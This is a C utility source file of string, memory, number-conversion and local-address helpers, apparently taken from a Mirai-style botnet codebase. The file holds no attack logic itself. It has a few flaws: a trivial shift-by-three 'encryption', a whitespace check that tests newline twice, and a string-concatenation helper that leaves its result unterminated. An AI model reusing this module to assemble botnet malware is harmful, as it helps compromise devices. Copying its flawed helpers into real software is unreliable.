#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/table.h"

int util_encryption(char *string)
{
	int r;
	for(r = 0; (r < 100 && string[r] != '\0'); r++)
	string[r] = string[r] - 3;
	return 0; 
}

BOOL mem_exists(char *buf, int buf_len, char *str, int str_len) {
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--) {
        if (*buf++ == str[matches]) {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

int util_strlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}


BOOL util_strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 < len || l2 < len)
        return FALSE;

    while (len--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return FALSE;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

void util_strcat(char *dst, char *src) {
    while (*dst)
        dst++;

    while (*src)
        *dst++ = *src++;
}

int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if (c >= base)
			break;

		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}

char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        #ifdef DEBUG
                printf("[util] Failed to call socket(), errno = %d\n", errno);
        #endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

int _startswith(char *haystack, char *needle)
{
    while (*needle)
    {
        if (*needle++ != *haystack++)
            return 0;
    }
    return 1;
}

char *_strdup(char *string)
{
    char *retstr = calloc(util_strlen(string) + 1, sizeof(char));

    _strcpy(retstr, string);

    return retstr;
}

int _strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 < len || l2 < len)
        return FALSE;

    while (len--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int _strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1);
    int l2 = util_strlen(str2);

    if (l1 != l2)
        return FALSE;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int _strcmp2(char *str1, char *str2)
{
    int len1 = util_strlen(str1), len2 = util_strlen(str2);

    if (len1 != len2)
        return 1;

    while (len1--)
    {
        if (*str1++ != *str2++)
            return 1;
    }
    return 0;
}

void _strcat(char *dst, char *src)
{
    while (*dst)
        dst++;

    while (*src)
        *dst++ = *src++;

    *dst = '\0';
}

int _strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    _memcpy(dst, src, l + 1);

    return l;
}

void _memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

void _zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int _atoi(char *str)
{
    int value = 0;

    while (util_isdigit(*str))
    {
        value *= 10;
        value += (int)(*str++ - '0');
    }

    return value;
}

char *_strstr(char *s, char *a)
{
    int a_len = util_strlen(a), match = 0;

    while (*s != 0)
    {
        if (*s == a[match])
        {
            if (++match == a_len)
                return s - a_len + 1;
        }
        else
            match = 0;
        s++;
    }

    return NULL;
}

void _memset(void *buf, char set, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = set;
}

char *_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        _strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int _memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int _stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}
